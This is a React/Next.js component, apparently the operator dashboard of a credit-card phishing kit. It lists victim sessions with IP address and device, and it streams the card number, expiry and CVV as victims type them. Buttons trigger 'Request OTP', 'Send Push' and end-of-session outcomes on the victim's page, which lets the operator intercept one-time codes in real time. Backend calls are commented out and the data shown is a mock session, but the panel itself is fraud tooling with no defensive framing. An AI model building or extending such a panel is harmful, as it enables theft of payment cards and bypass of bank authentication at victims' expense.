"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";
import { ref, onValue, update } from "firebase/database";
import { db } from "@/lib/firebase";
import { Smartphone, Monitor, CreditCard, Bell, CheckCircle, XCircle, Lock } from "lucide-react";

interface SessionData {
    id: string;
    ip: string;
    ua: string;
    device: string;
    card?: string;
    cvv?: string;
    expiry?: string;
    status: "active" | "success" | "failed";
    lastActive: number;
}

export default function LivePanel() {
    const params = useParams();
    const projectId = params.projectId as string;
    const [sessions, setSessions] = useState<SessionData[]>([]);
    const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);

    // Mock data for UI testing if Firebase is not connected
    useEffect(() => {
        // In a real scenario, this would be the Firebase listener
        // const sessionsRef = ref(db, `projects/${projectId}/sessions`);
        // return onValue(sessionsRef, (snapshot) => { ... });

        // For now, let's populate with some dummy data to show the UI
        setSessions([
            {
                id: "sess_123",
                ip: "192.168.1.1",
                ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
                device: "Mobile (iPhone)",
                card: "4242 4242 4242",
                cvv: "123",
                expiry: "12/25",
                status: "active",
                lastActive: Date.now()
            }
        ]);
        setSelectedSessionId("sess_123");
    }, [projectId]);

    const sendCommand = async (command: string) => {
        if (!selectedSessionId) return;
        // await update(ref(db, `projects/${projectId}/sessions/${selectedSessionId}`), { command });
        console.log(`Sending command: ${command} to ${selectedSessionId}`);
    };

    const selectedSession = sessions.find(s => s.id === selectedSessionId);

    return (
        <div className="flex h-screen bg-background overflow-hidden">
            {/* Sidebar - Session List */}
            <div className="w-80 border-r border-border bg-card flex flex-col">
                <div className="p-4 border-b border-border">
                    <h2 className="font-bold text-lg flex items-center gap-2">
                        <ActivityIcon className="w-5 h-5 text-green-500" />
                        Live Traffic
                    </h2>
                </div>
                <div className="flex-1 overflow-y-auto">
                    {sessions.map((session) => (
                        <div
                            key={session.id}
                            onClick={() => setSelectedSessionId(session.id)}
                            className={`p-4 border-b border-border cursor-pointer hover:bg-secondary/50 transition-colors ${selectedSessionId === session.id ? "bg-secondary border-l-4 border-l-primary" : ""
                                }`}
                        >
                            <div className="flex justify-between items-start mb-1">
                                <span className="font-mono text-xs text-muted-foreground">{session.ip}</span>
                                <span className="text-xs text-green-500">Online</span>
                            </div>
                            <div className="flex items-center gap-2 text-sm font-medium mb-1">
                                {session.device.includes("Mobile") ? <Smartphone className="w-4 h-4" /> : <Monitor className="w-4 h-4" />}
                                {session.device}
                            </div>
                            <div className="text-xs text-muted-foreground truncate">{session.ua}</div>
                        </div>
                    ))}
                </div>
            </div>

            {/* Main Content - Live View */}
            <div className="flex-1 flex flex-col bg-secondary/10">
                {selectedSession ? (
                    <>
                        <header className="h-16 border-b border-border bg-card flex items-center justify-between px-6">
                            <div className="flex items-center gap-4">
                                <h1 className="text-xl font-bold">Session: {selectedSession.id}</h1>
                                <span className="px-2 py-1 bg-green-500/10 text-green-500 text-xs rounded-full">
                                    Live Connection
                                </span>
                            </div>
                        </header>

                        <main className="flex-1 p-6 grid grid-cols-1 lg:grid-cols-2 gap-6 overflow-y-auto">
                            {/* Live Form View */}
                            <div className="bg-card rounded-xl border border-border p-6 shadow-sm">
                                <h3 className="text-sm font-medium text-muted-foreground mb-6 uppercase tracking-wider">
                                    Live Input Stream
                                </h3>

                                <div className="space-y-6">
                                    <div className="space-y-2">
                                        <label className="text-xs font-medium text-muted-foreground">Card Number</label>
                                        <div className="text-2xl font-mono tracking-wider flex items-center gap-3 p-4 bg-secondary rounded-lg border border-border/50">
                                            <CreditCard className="w-6 h-6 text-primary" />
                                            {selectedSession.card || "Waiting..."}
                                        </div>
                                    </div>

                                    <div className="grid grid-cols-2 gap-6">
                                        <div className="space-y-2">
                                            <label className="text-xs font-medium text-muted-foreground">Expiry Date</label>
                                            <div className="text-xl font-mono p-4 bg-secondary rounded-lg border border-border/50">
                                                {selectedSession.expiry || "--/--"}
                                            </div>
                                        </div>
                                        <div className="space-y-2">
                                            <label className="text-xs font-medium text-muted-foreground">CVV / CVC</label>
                                            <div className="text-xl font-mono p-4 bg-secondary rounded-lg border border-border/50 text-red-400">
                                                {selectedSession.cvv || "---"}
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* Control Panel */}
                            <div className="space-y-6">
                                <div className="bg-card rounded-xl border border-border p-6 shadow-sm">
                                    <h3 className="text-sm font-medium text-muted-foreground mb-4 uppercase tracking-wider">
                                        Actions
                                    </h3>
                                    <div className="grid grid-cols-2 gap-4">
                                        <button
                                            onClick={() => sendCommand("OTP")}
                                            className="flex flex-col items-center justify-center gap-2 p-6 rounded-xl bg-blue-500/10 text-blue-500 hover:bg-blue-500/20 border border-blue-500/20 transition-all"
                                        >
                                            <Lock className="w-6 h-6" />
                                            <span className="font-bold">Request OTP</span>
                                        </button>
                                        <button
                                            onClick={() => sendCommand("PUSH")}
                                            className="flex flex-col items-center justify-center gap-2 p-6 rounded-xl bg-purple-500/10 text-purple-500 hover:bg-purple-500/20 border border-purple-500/20 transition-all"
                                        >
                                            <Bell className="w-6 h-6" />
                                            <span className="font-bold">Send Push</span>
                                        </button>
                                        <button
                                            onClick={() => sendCommand("SUCCESS")}
                                            className="flex flex-col items-center justify-center gap-2 p-6 rounded-xl bg-green-500/10 text-green-500 hover:bg-green-500/20 border border-green-500/20 transition-all"
                                        >
                                            <CheckCircle className="w-6 h-6" />
                                            <span className="font-bold">End Success</span>
                                        </button>
                                        <button
                                            onClick={() => sendCommand("FAIL")}
                                            className="flex flex-col items-center justify-center gap-2 p-6 rounded-xl bg-red-500/10 text-red-500 hover:bg-red-500/20 border border-red-500/20 transition-all"
                                        >
                                            <XCircle className="w-6 h-6" />
                                            <span className="font-bold">End Failed</span>
                                        </button>
                                    </div>
                                </div>

                                <div className="bg-card rounded-xl border border-border p-6 shadow-sm">
                                    <h3 className="text-sm font-medium text-muted-foreground mb-4 uppercase tracking-wider">
                                        Device Info
                                    </h3>
                                    <dl className="space-y-2 text-sm">
                                        <div className="flex justify-between">
                                            <dt className="text-muted-foreground">IP Address</dt>
                                            <dd className="font-mono">{selectedSession.ip}</dd>
                                        </div>
                                        <div className="flex justify-between">
                                            <dt className="text-muted-foreground">User Agent</dt>
                                            <dd className="font-mono truncate max-w-[200px]" title={selectedSession.ua}>{selectedSession.ua}</dd>
                                        </div>
                                    </dl>
                                </div>
                            </div>
                        </main>
                    </>
                ) : (
                    <div className="flex-1 flex items-center justify-center text-muted-foreground">
                        Select a session to view live details
                    </div>
                )}
            </div>
        </div>
    );
}

function ActivityIcon({ className }: { className?: string }) {
    return (
        <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M22 12h-4l-3 9L9 3l-3 9H2" />
        </svg>
    );
}
